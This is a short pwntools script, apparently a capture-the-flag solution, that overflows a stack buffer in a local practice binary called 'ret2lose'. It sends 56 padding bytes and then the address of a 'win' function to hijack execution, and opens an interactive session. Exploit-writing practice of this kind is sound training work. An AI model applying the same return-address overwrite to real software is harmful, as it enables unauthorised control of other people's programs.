from pwn import *

binary_path = './ret2lose'
p = process(binary_path)
#p = remote("127.0.0.1",1235)

# We skip endbr instruction
win_addr = p64(0x4011da)

payload = b'A' *56  + win_addr 
p.sendline(payload)
p.interactive()

